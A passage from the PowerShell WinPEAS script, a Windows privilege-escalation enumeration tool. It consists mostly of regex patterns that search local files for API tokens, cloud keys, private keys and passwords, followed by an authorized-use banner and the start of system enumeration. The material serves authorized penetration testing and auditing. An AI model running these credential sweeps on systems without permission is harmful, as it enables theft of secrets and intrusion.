  $regexSearch.add("sha256", "(^|[^a-zA-Z0-9])[a-fA-F0-9]{64}([^a-zA-Z0-9]|$)")
  $regexSearch.add("sha512", "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)")  
  # This does not work correctly
  #$regexSearch.add("Base32", "(?:[A-Z2-7]{8})*(?:[A-Z2-7]{2}={6}|[A-Z2-7]{4}={4}|[A-Z2-7]{5}={3}|[A-Z2-7]{7}=)?")
  $regexSearch.add("Base64", "(eyJ|YTo|Tzo|PD[89]|aHR0cHM6L|aHR0cDo|rO0)[a-zA-Z0-9+\/]+={0,2}")
}

if ($username) {
  $regexSearch.add("Usernames1", "username[=:].+")
  $regexSearch.add("Usernames2", "user[=:].+")
  $regexSearch.add("Usernames3", "login[=:].+")
  $regexSearch.add("Emails", "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}")
  $regexSearch.add("Net user add", "net user .+ /add")
}

if ($FullCheck) {
  $regexSearch.add("Artifactory API Token", "AKC[a-zA-Z0-9]{10,}")
  $regexSearch.add("Artifactory Password", "AP[0-9ABCDEF][a-zA-Z0-9]{8,}")
  $regexSearch.add("Adafruit API Key", "([a-z0-9_-]{32})")
  $regexSearch.add("Adafruit API Key", "([a-z0-9_-]{32})")
  $regexSearch.add("Adobe Client Id (Oauth Web)", "(adobe[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{32})['""]")
  $regexSearch.add("Abode Client Secret", "(p8e-)[a-z0-9]{32}")
  $regexSearch.add("Age Secret Key", "AGE-SECRET-KEY-1[QPZRY9X8GF2TVDW0S3JN54KHCE6MUA7L]{58}")
  $regexSearch.add("Airtable API Key", "([a-z0-9]{17})")
  $regexSearch.add("Alchemi API Key", "(alchemi[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9-]{32})['""]")
  $regexSearch.add("Artifactory API Key & Password", "[""']AKC[a-zA-Z0-9]{10,}[""']|[""']AP[0-9ABCDEF][a-zA-Z0-9]{8,}[""']")
  $regexSearch.add("Atlassian API Key", "(atlassian[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{24})['""]")
  $regexSearch.add("Binance API Key", "(binance[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9]{64})['""]")
  $regexSearch.add("Bitbucket Client Id", "((bitbucket[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""])")
  $regexSearch.add("Bitbucket Client Secret", "((bitbucket[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9_\-]{64})['""])")
  $regexSearch.add("BitcoinAverage API Key", "(bitcoin.?average[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9]{43})['""]")
  $regexSearch.add("Bitquery API Key", "(bitquery[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Za-z0-9]{32})['""]")
  $regexSearch.add("Bittrex Access Key and Access Key", "([a-z0-9]{32})")
  $regexSearch.add("Birise API Key", "(bitrise[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9_\-]{86})['""]")
  $regexSearch.add("Block API Key", "(block[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4})['""]")
  $regexSearch.add("Blockchain API Key", "mainnet[a-zA-Z0-9]{32}|testnet[a-zA-Z0-9]{32}|ipfs[a-zA-Z0-9]{32}")
  $regexSearch.add("Blockfrost API Key", "(blockchain[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[0-9a-f]{12})['""]")
  $regexSearch.add("Box API Key", "(box[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9]{32})['""]")
  $regexSearch.add("Bravenewcoin API Key", "(bravenewcoin[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{50})['""]")
  $regexSearch.add("Clearbit API Key", "sk_[a-z0-9]{32}")
  $regexSearch.add("Clojars API Key", "(CLOJARS_)[a-zA-Z0-9]{60}")
  $regexSearch.add("Coinbase Access Token", "([a-z0-9_-]{64})")
  $regexSearch.add("Coinlayer API Key", "(coinlayer[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  $regexSearch.add("Coinlib API Key", "(coinlib[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{16})['""]")
  $regexSearch.add("Confluent Access Token & Secret Key", "([a-z0-9]{16})")
  $regexSearch.add("Contentful delivery API Key", "(contentful[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9=_\-]{43})['""]")
  $regexSearch.add("Covalent API Key", "ckey_[a-z0-9]{27}")
  $regexSearch.add("Charity Search API Key", "(charity.?search[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  $regexSearch.add("Databricks API Key", "dapi[a-h0-9]{32}")
  $regexSearch.add("DDownload API Key", "(ddownload[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{22})['""]")
  $regexSearch.add("Defined Networking API token", "(dnkey-[a-z0-9=_\-]{26}-[a-z0-9=_\-]{52})")
  $regexSearch.add("Discord API Key, Client ID & Client Secret", "((discord[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-h0-9]{64}|[0-9]{18}|[a-z0-9=_\-]{32})['""])")
  $regexSearch.add("Droneci Access Token", "([a-z0-9]{32})")
  $regexSearch.add("Dropbox API Key", "sl.[a-zA-Z0-9_-]{136}")
  $regexSearch.add("Doppler API Key", "(dp\.pt\.)[a-zA-Z0-9]{43}")
  $regexSearch.add("Dropbox API secret/key, short & long lived API Key", "(dropbox[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{15}|sl\.[a-z0-9=_\-]{135}|[a-z0-9]{11}(AAAAAAAAAA)[a-z0-9_=\-]{43})['""]")
  $regexSearch.add("Duffel API Key", "duffel_(test|live)_[a-zA-Z0-9_-]{43}")
  $regexSearch.add("Dynatrace API Key", "dt0c01\.[a-zA-Z0-9]{24}\.[a-z0-9]{64}")
  $regexSearch.add("EasyPost API Key", "EZAK[a-zA-Z0-9]{54}")
  $regexSearch.add("EasyPost test API Key", "EZTK[a-zA-Z0-9]{54}")
  $regexSearch.add("Etherscan API Key", "(etherscan[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Z0-9]{34})['""]")
  $regexSearch.add("Etsy Access Token", "([a-z0-9]{24})")
  $regexSearch.add("Facebook Access Token", "EAACEdEose0cBA[0-9A-Za-z]+")
  $regexSearch.add("Fastly API Key", "(fastly[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9=_\-]{32})['""]")
  $regexSearch.add("Finicity API Key & Client Secret", "(finicity[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{32}|[a-z0-9]{20})['""]")
  $regexSearch.add("Flickr Access Token", "([a-z0-9]{32})")
  $regexSearch.add("Flutterweave Keys", "FLWPUBK_TEST-[a-hA-H0-9]{32}-X|FLWSECK_TEST-[a-hA-H0-9]{32}-X|FLWSECK_TEST[a-hA-H0-9]{12}")
  $regexSearch.add("Frame.io API Key", "fio-u-[a-zA-Z0-9_=\-]{64}")
  $regexSearch.add("Freshbooks Access Token", "([a-z0-9]{64})")
  $regexSearch.add("Github", "github(.{0,20})?['""][0-9a-zA-Z]{35,40}")
  $regexSearch.add("Github App Token", "(ghu|ghs)_[0-9a-zA-Z]{36}")
  $regexSearch.add("Github OAuth Access Token", "gho_[0-9a-zA-Z]{36}")
  $regexSearch.add("Github Personal Access Token", "ghp_[0-9a-zA-Z]{36}")
  $regexSearch.add("Github Refresh Token", "ghr_[0-9a-zA-Z]{76}")
  $regexSearch.add("GitHub Fine-Grained Personal Access Token", "github_pat_[0-9a-zA-Z_]{82}")
  $regexSearch.add("Gitlab Personal Access Token", "glpat-[0-9a-zA-Z\-]{20}")
  $regexSearch.add("GitLab Pipeline Trigger Token", "glptt-[0-9a-f]{40}")
  $regexSearch.add("GitLab Runner Registration Token", "GR1348941[0-9a-zA-Z_\-]{20}")
  $regexSearch.add("Gitter Access Token", "([a-z0-9_-]{40})")
  $regexSearch.add("GoCardless API Key", "live_[a-zA-Z0-9_=\-]{40}")
  $regexSearch.add("GoFile API Key", "(gofile[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9]{32})['""]")
  $regexSearch.add("Google API Key", "AIza[0-9A-Za-z_\-]{35}")
  $regexSearch.add("Google Cloud Platform API Key", "(google|gcp|youtube|drive|yt)(.{0,20})?['""][AIza[0-9a-z_\-]{35}]['""]")
  $regexSearch.add("Google Drive Oauth", "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com")
  $regexSearch.add("Google Oauth Access Token", "ya29\.[0-9A-Za-z_\-]+")
  $regexSearch.add("Google (GCP) Service-account", """type.+:.+""service_account")
  $regexSearch.add("Grafana API Key", "eyJrIjoi[a-z0-9_=\-]{72,92}")
  $regexSearch.add("Grafana cloud api token", "glc_[A-Za-z0-9\+/]{32,}={0,2}")
  $regexSearch.add("Grafana service account token", "(glsa_[A-Za-z0-9]{32}_[A-Fa-f0-9]{8})")
  $regexSearch.add("Hashicorp Terraform user/org API Key", "[a-z0-9]{14}\.atlasv1\.[a-z0-9_=\-]{60,70}")
  $regexSearch.add("Heroku API Key", "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}")
  $regexSearch.add("Hubspot API Key", "['""][a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12}['""]")
  $regexSearch.add("Instatus API Key", "(instatus[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  $regexSearch.add("Intercom API Key & Client Secret/ID", "(intercom[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9=_]{60}|[a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12})['""]")
  $regexSearch.add("Ionic API Key", "(ionic[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""](ion_[a-z0-9]{42})['""]")
  $regexSearch.add("JSON Web Token", "(ey[0-9a-z]{30,34}\.ey[0-9a-z\/_\-]{30,}\.[0-9a-zA-Z\/_\-]{10,}={0,2})")
  $regexSearch.add("Kraken Access Token", "([a-z0-9\/=_\+\-]{80,90})")
  $regexSearch.add("Kucoin Access Token", "([a-f0-9]{24})")
  $regexSearch.add("Kucoin Secret Key", "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
  $regexSearch.add("Launchdarkly Access Token", "([a-z0-9=_\-]{40})")
  $regexSearch.add("Linear API Key", "(lin_api_[a-zA-Z0-9]{40})")
  $regexSearch.add("Linear Client Secret/ID", "((linear[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{32})['""])")
  $regexSearch.add("LinkedIn Client ID", "linkedin(.{0,20})?['""][0-9a-z]{12}['""]")
  $regexSearch.add("LinkedIn Secret Key", "linkedin(.{0,20})?['""][0-9a-z]{16}['""]")
  $regexSearch.add("Lob API Key", "((lob[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]((live|test)_[a-f0-9]{35})['""])|((lob[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]((test|live)_pub_[a-f0-9]{31})['""])")
  $regexSearch.add("Lob Publishable API Key", "((test|live)_pub_[a-f0-9]{31})")
  $regexSearch.add("MailboxValidator", "(mailbox.?validator[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Z0-9]{20})['""]")
  $regexSearch.add("Mailchimp API Key", "[0-9a-f]{32}-us[0-9]{1,2}")
  $regexSearch.add("Mailgun API Key", "key-[0-9a-zA-Z]{32}'")
  $regexSearch.add("Mailgun Public Validation Key", "pubkey-[a-f0-9]{32}")
  $regexSearch.add("Mailgun Webhook signing key", "[a-h0-9]{32}-[a-h0-9]{8}-[a-h0-9]{8}")
  $regexSearch.add("Mapbox API Key", "(pk\.[a-z0-9]{60}\.[a-z0-9]{22})")
  $regexSearch.add("Mattermost Access Token", "([a-z0-9]{26})")
  $regexSearch.add("MessageBird API Key & API client ID", "(messagebird[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{25}|[a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12})['""]")
  $regexSearch.add("Microsoft Teams Webhook", "https:\/\/[a-z0-9]+\.webhook\.office\.com\/webhookb2\/[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}@[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}\/IncomingWebhook\/[a-z0-9]{32}\/[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}")
  $regexSearch.add("MojoAuth API Key", "[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}")
  $regexSearch.add("Netlify Access Token", "([a-z0-9=_\-]{40,46})")
  $regexSearch.add("New Relic User API Key, User API ID & Ingest Browser API Key", "(NRAK-[A-Z0-9]{27})|((newrelic[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Z0-9]{64})['""])|(NRJS-[a-f0-9]{19})")
  $regexSearch.add("Nownodes", "(nownodes[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Za-z0-9]{32})['""]")
  $regexSearch.add("Npm Access Token", "(npm_[a-zA-Z0-9]{36})")
  $regexSearch.add("Nytimes Access Token", "([a-z0-9=_\-]{32})")
  $regexSearch.add("Okta Access Token", "([a-z0-9=_\-]{42})")
  $regexSearch.add("OpenAI API Token", "sk-[A-Za-z0-9]{48}")
  $regexSearch.add("ORB Intelligence Access Key", "['""][a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}['""]")
  $regexSearch.add("Pastebin API Key", "(pastebin[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  $regexSearch.add("PayPal Braintree Access Token", 'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}')
  $regexSearch.add("Picatic API Key", "sk_live_[0-9a-z]{32}")
  $regexSearch.add("Pinata API Key", "(pinata[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{64})['""]")
  $regexSearch.add("Planetscale API Key", "pscale_tkn_[a-zA-Z0-9_\.\-]{43}")
  $regexSearch.add("PlanetScale OAuth token", "(pscale_oauth_[a-zA-Z0-9_\.\-]{32,64})")
  $regexSearch.add("Planetscale Password", "pscale_pw_[a-zA-Z0-9_\.\-]{43}")
  $regexSearch.add("Plaid API Token", "(access-(?:sandbox|development|production)-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
  $regexSearch.add("Plaid Client ID", "([a-z0-9]{24})")
  $regexSearch.add("Plaid Secret key", "([a-z0-9]{30})")
  $regexSearch.add("Prefect API token", "(pnu_[a-z0-9]{36})")
  $regexSearch.add("Postman API Key", "PMAK-[a-fA-F0-9]{24}-[a-fA-F0-9]{34}")
  $regexSearch.add("Private Keys", "\-\-\-\-\-BEGIN PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN RSA PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN OPENSSH PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN PGP PRIVATE KEY BLOCK\-\-\-\-\-|\-\-\-\-\-BEGIN DSA PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN EC PRIVATE KEY\-\-\-\-\-")
  $regexSearch.add("Pulumi API Key", "pul-[a-f0-9]{40}")
  $regexSearch.add("PyPI upload token", "pypi-AgEIcHlwaS5vcmc[A-Za-z0-9_\-]{50,}")
  $regexSearch.add("Quip API Key", "(quip[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9]{15}=\|[0-9]{10}\|[a-zA-Z0-9\/+]{43}=)['""]")
  $regexSearch.add("RapidAPI Access Token", "([a-z0-9_-]{50})")
  $regexSearch.add("Rubygem API Key", "rubygems_[a-f0-9]{48}")
  $regexSearch.add("Readme API token", "rdme_[a-z0-9]{70}")
  $regexSearch.add("Sendbird Access ID", "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
  $regexSearch.add("Sendbird Access Token", "([a-f0-9]{40})")
  $regexSearch.add("Sendgrid API Key", "SG\.[a-zA-Z0-9_\.\-]{66}")
  $regexSearch.add("Sendinblue API Key", "xkeysib-[a-f0-9]{64}-[a-zA-Z0-9]{16}")
  $regexSearch.add("Sentry Access Token", "([a-f0-9]{64})")
  $regexSearch.add("Shippo API Key, Access Token, Custom Access Token, Private App Access Token & Shared Secret", "shippo_(live|test)_[a-f0-9]{40}|shpat_[a-fA-F0-9]{32}|shpca_[a-fA-F0-9]{32}|shppa_[a-fA-F0-9]{32}|shpss_[a-fA-F0-9]{32}")
  $regexSearch.add("Sidekiq Secret", "([a-f0-9]{8}:[a-f0-9]{8})")
  $regexSearch.add("Sidekiq Sensitive URL", "([a-f0-9]{8}:[a-f0-9]{8})@(?:gems.contribsys.com|enterprise.contribsys.com)")
  $regexSearch.add("Slack Token", "xox[baprs]-([0-9a-zA-Z]{10,48})?")
  $regexSearch.add("Slack Webhook", "https://hooks.slack.com/services/T[a-zA-Z0-9_]{10}/B[a-zA-Z0-9_]{10}/[a-zA-Z0-9_]{24}")
  $regexSearch.add("Smarksheel API Key", "(smartsheet[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{26})['""]")
  $regexSearch.add("Square Access Token", "sqOatp-[0-9A-Za-z_\-]{22}")
  $regexSearch.add("Square API Key", "EAAAE[a-zA-Z0-9_-]{59}")
  $regexSearch.add("Square Oauth Secret", "sq0csp-[ 0-9A-Za-z_\-]{43}")
  $regexSearch.add("Stytch API Key", "secret-.*-[a-zA-Z0-9_=\-]{36}")
  $regexSearch.add("Stripe Access Token & API Key", "(sk|pk)_(test|live)_[0-9a-z]{10,32}|k_live_[0-9a-zA-Z]{24}")
  $regexSearch.add("SumoLogic Access ID", "([a-z0-9]{14})")
  $regexSearch.add("SumoLogic Access Token", "([a-z0-9]{64})")
  $regexSearch.add("Telegram Bot API Token", "[0-9]+:AA[0-9A-Za-z\\-_]{33}")
  $regexSearch.add("Travis CI Access Token", "([a-z0-9]{22})")
  $regexSearch.add("Trello API Key", "(trello[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9a-z]{32})['""]")
  $regexSearch.add("Twilio API Key", "SK[0-9a-fA-F]{32}")
  $regexSearch.add("Twitch API Key", "(twitch[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{30})['""]")
  $regexSearch.add("Twitter Client ID", "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['""][0-9a-z]{18,25}")
  $regexSearch.add("Twitter Bearer Token", "(A{22}[a-zA-Z0-9%]{80,100})")
  $regexSearch.add("Twitter Oauth", "[tT][wW][iI][tT][tT][eE][rR].{0,30}['""\\s][0-9a-zA-Z]{35,44}['""\\s]")
  $regexSearch.add("Twitter Secret Key", "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['""][0-9a-z]{35,44}")
  $regexSearch.add("Typeform API Key", "tfp_[a-z0-9_\.=\-]{59}")
  $regexSearch.add("URLScan API Key", "['""][a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}['""]")
  $regexSearch.add("Vault Token", "[sb]\.[a-zA-Z0-9]{24}")
  $regexSearch.add("Yandex Access Token", "(t1\.[A-Z0-9a-z_-]+[=]{0,2}\.[A-Z0-9a-z_-]{86}[=]{0,2})")
  $regexSearch.add("Yandex API Key", "(AQVN[A-Za-z0-9_\-]{35,38})")
  $regexSearch.add("Yandex AWS Access Token", "(YC[a-zA-Z0-9_\-]{38})")
  $regexSearch.add("Web3 API Key", "(web3[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Za-z0-9_=\-]+\.[A-Za-z0-9_=\-]+\.?[A-Za-z0-9_.+/=\-]*)['""]")
  $regexSearch.add("Zendesk Secret Key", "([a-z0-9]{40})")
  $regexSearch.add("Generic API Key", "((key|api|token|secret|password)[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9a-zA-Z_=\-]{8,64})['""]")
}

if ($webAuth) {
  $regexSearch.add("Authorization Basic", "basic [a-zA-Z0-9_:\.=\-]+")
  $regexSearch.add("Authorization Bearer", "bearer [a-zA-Z0-9_\.=\-]+")
  $regexSearch.add("Alibaba Access Key ID", "(LTAI)[a-z0-9]{20}")
  $regexSearch.add("Alibaba Secret Key", "(alibaba[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{30})['""]")
  $regexSearch.add("Asana Client ID", "((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9]{16})['""])|((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""])")
  $regexSearch.add("AWS Client ID", "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}")
  $regexSearch.add("AWS MWS Key", "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
  $regexSearch.add("AWS Secret Key", "aws(.{0,20})?['""][0-9a-zA-Z\/+]{40}['""]")
  $regexSearch.add("AWS AppSync GraphQL Key", "da2-[a-z0-9]{26}")
  $regexSearch.add("Basic Auth Credentials", "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+")
  $regexSearch.add("Beamer Client Secret", "(beamer[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""](b_[a-z0-9=_\-]{44})['""]")
  $regexSearch.add("Cloudinary Basic Auth", "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+")
  $regexSearch.add("Facebook Client ID", "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['""][0-9]{13,17}")
  $regexSearch.add("Facebook Oauth", "[fF][aA][cC][eE][bB][oO][oO][kK].*['|""][0-9a-f]{32}['|""]")
  $regexSearch.add("Facebook Secret Key", "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['""][0-9a-f]{32}")
  $regexSearch.add("Jenkins Creds", "<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<")
  $regexSearch.add("Generic Secret", "[sS][eE][cC][rR][eE][tT].*['""][0-9a-zA-Z]{32,45}['""]")
  $regexSearch.add("Basic Auth", "//(.+):(.+)@")
  $regexSearch.add("PHP Passwords", "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass|pass').*[=:].+|define ?\('(\w*pass|\w*pwd|\w*user|\w*datab)")
  $regexSearch.add("Config Secrets (Passwd / Credentials)", "passwd.*|creden.*|^kind:[^a-zA-Z0-9_]?Secret|[^a-zA-Z0-9_]env:|secret:|secretName:|^kind:[^a-zA-Z0-9_]?EncryptionConfiguration|\-\-encryption\-provider\-config")
  $regexSearch.add("Generiac API tokens search", "(access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key| amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret| api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret| application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket| aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password| bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key| bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver| cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret| client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password| cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|conn.login| connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test| datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password| digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd| docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid| dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password| env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .,<\-]{0,25}(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9a-zA-Z_=\-]{8,64})['""]")
}

if($FullCheck){$Excel = $true}

$regexSearch.add("IPs", "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)")
$Drives = Get-PSDrive | Where-Object { $_.Root -like "*:\" }
$fileExtensions = @("*.xml", "*.txt", "*.conf", "*.config", "*.cfg", "*.ini", ".y*ml", "*.log", "*.bak", "*.xls", "*.xlsx", "*.xlsm")


######################## INTRODUCTION ########################
$stopwatch = [system.diagnostics.stopwatch]::StartNew()

if ($FullCheck) {
  Write-Host "**Full Check Enabled. This will significantly increase false positives in registry / folder check for Usernames / Passwords.**"
}
# Introduction    
Write-Host -BackgroundColor Red -ForegroundColor White "ADVISORY: WinPEAS - Windows local Privilege Escalation Awesome Script"
Write-Host -BackgroundColor Red -ForegroundColor White "WinPEAS should be used for authorized penetration testing and/or educational purposes only"
Write-Host -BackgroundColor Red -ForegroundColor White "Any misuse of this software will not be the responsibility of the author or of any other collaborator"
Write-Host -BackgroundColor Red -ForegroundColor White "Use it at your own networks and/or with the network owner's explicit permission"


# Color Scheme Introduction
Write-Host -ForegroundColor red    "Indicates special privilege over an object or misconfiguration"
Write-Host -ForegroundColor green  "Indicates protection is enabled or something is well configured"
Write-Host -ForegroundColor cyan   "Indicates active users"
Write-Host -ForegroundColor Gray   "Indicates disabled users"
Write-Host -ForegroundColor yellow "Indicates links"
Write-Host -ForegroundColor Blue   "Indicates title"


Write-Host "You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html" -ForegroundColor Yellow
Write-Host "Best Linux PE & Hardening course: https://hacktricks-training.com/courses/lhe/" -ForegroundColor Yellow
#write-host  "Creating Dynamic lists, this could take a while, please wait..."
#write-host  "Loading sensitive_files yaml definitions file..."
#write-host  "Loading regexes yaml definitions file..."


######################## SYSTEM INFORMATION ########################

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host "====================================||SYSTEM INFORMATION ||===================================="
"The following information is curated. To get a full list of system information, run the cmdlet get-computerinfo"

#System Info from get-computer info
systeminfo.exe


#Hotfixes installed sorted by date
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| WINDOWS HOTFIXES"
